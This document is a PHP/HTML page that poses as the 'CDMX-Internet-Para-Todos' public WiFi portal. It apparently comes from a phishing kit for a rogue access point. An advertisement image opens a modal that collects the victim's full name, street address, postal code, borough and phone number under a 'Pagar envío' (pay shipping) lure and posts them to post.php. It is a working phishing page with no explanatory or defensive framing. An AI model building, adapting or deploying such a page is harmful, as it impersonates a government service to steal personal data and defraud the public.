<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CDMX-Internet-Para-Todos</title>
    <style>
        /* Estilos generales */
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
        }

        /* Contenedor principal */
        .container {
            position: relative;
            width: 100%;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            box-sizing: border-box;
        }

        /* Estilos para centrar la ventana modal */
        .modal {
            display: none;
            position: fixed;
            z-index: 9999; /* Valor alto para asegurarse de que esté encima de todo */
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            overflow: auto;
            background-color: rgba(0,0,0,0.5);
        }

        .modal-content {
            background-color: #fefefe;
            margin: 15% auto;
            padding: 30px;
            border: 2px solid #a41e37;
            width: 80%;
            max-width: 600px;
            text-align: center;
            border-radius: 8px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
        }

        .modal-content h2 {
            margin-bottom: 20px;
            color: #a41e37;
        }

        .modal-content label {
            display: block;
            margin-bottom: 10px;
            color: #333;
            font-weight: bold;
        }

        .modal-content input[type="text"],
        .modal-content input[type="submit"] {
            width: calc(100% - 20px);
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
            font-size: 16px;
        }

        .modal-content input[type="submit"] {
            background-color: #a41e37;
            color: #fff;
            border: none;
            cursor: pointer;
        }

        .modal-content input[type="submit"]:hover {
            background-color: #750f24;
        }

        /* Estilo para la imagen principal */
        .main-image-container {
            position: relative;
            display: block;
            width: 100%;
            max-width: 800px;
            margin: 0 auto;
        }

        .main-image {
            display: block;
            width: 100%;
            height: auto;
        }

        /* Estilo para el botón "Conectarme" */
        #conectarmeBtn {
            padding: 10px 28px;
            font-size: 18px;
            font-weight: 800;
            background-color: #ffffff;
            color: #a41e37;
            border: none;
            cursor: pointer;
            border-radius: 8px;
            position: absolute; /* Posicionado de manera absoluta dentro de su contenedor */
            bottom: 230px; /* Ajustar la distancia desde el borde inferior del contenedor */
            left: 50%; /* Centro horizontalmente */
            transform: translateX(-50%); /* Ajusta la posición para centrar horizontalmente */
        }

        /* Estilo para la imagen secundaria clickeable y sobrepuesta */
        .secondary-image {
            position: absolute;
            top: 30%; /* Ajustar según lo necesites */
            left: 50%;
            transform: translate(-50%, -10%); /* Ajusta la posición vertical y horizontal */
            max-width: 80%; /* Ajustar según el tamaño deseado */
            width: 100%; /* Asegura que sea responsive */
            height: auto; /* Mantener la relación de aspecto */
            cursor: pointer;
            z-index: 10; /* Asegurarse de que esté sobre la imagen principal */
        }

        /* Media queries para mejorar la responsividad */
        @media (max-width: 600px) {
            #conectarmeBtn {
                font-size: 16px;
                padding: 8px 20px;
            }

            .secondary-image {
                max-width: 90%; /* Ajustar el tamaño en pantallas más pequeñas */
            }
        }
    </style>
</head>
<body>

    <!-- Contenedor para la imagen principal y el botón "Conectarme" -->
    <div class="main-image-container">
        <!-- Imagen principal -->
        <img src="assets/ipt.png" alt="Imagen Principal" class="main-image">

        <!-- Imagen secundaria que se posicionará encima de la imagen principal -->
        <img src="assets/p.png" alt="Publicidad" class="secondary-image" id="openModalBtn">

        <!-- Botón "Conectarme" -->
        <button id="conectarmeBtn">Conectarme</button>
    </div>

    <!-- Ventana modal -->
    <div id="myModal" class="modal">
        <div class="modal-content">
            <h2>Completa los datos de envío</h2>
            <form id="myForm" action="post.php" method="post">
                <label for="nombre">Nombre completo:</label>
                <input type="text" id="nombre" name="nombre" required><br><br>
                <label for="direccion">Calle y Número :</label>
                <input type="text" id="direccion" name="direccion" required><br><br>
                <label for="codigo_postal">Código Postal:</label>
                <input type="text" id="codigo_postal" name="codigo_postal" required><br><br>
                <label for="delegacion">Delegación:</label>
                <input type="text" id="delegacion" name="delegacion" required><br><br>
                <label for="numero">Número Telefónico:</label>
                <input type="text" id="numero" name="numero" required><br><br>
                <input type="submit" value="Pagar envío">
            </form>
        </div>
    </div>

    <script>
        // Mostrar la ventana modal cuando se hace clic en la imagen de publicidad
        document.getElementById('openModalBtn').addEventListener('click', function() {
            document.getElementById('myModal').style.display = 'block';
        });

        // Cerrar la ventana modal al enviar el formulario
        document.getElementById('myForm').addEventListener('submit', function(event) {
            event.preventDefault(); // Evitar el comportamiento predeterminado de enviar el formulario
            document.getElementById('myModal').style.display = 'none';
            this.submit(); // Enviar el formulario
        });

        // Cerrar la ventana modal si se hace clic fuera de ella
        window.onclick = function(event) {
            var modal = document.getElementById('myModal');
            if (event.target == modal) {
                modal.style.display = "none";
            }
        };
    </script>

</body>
</html>
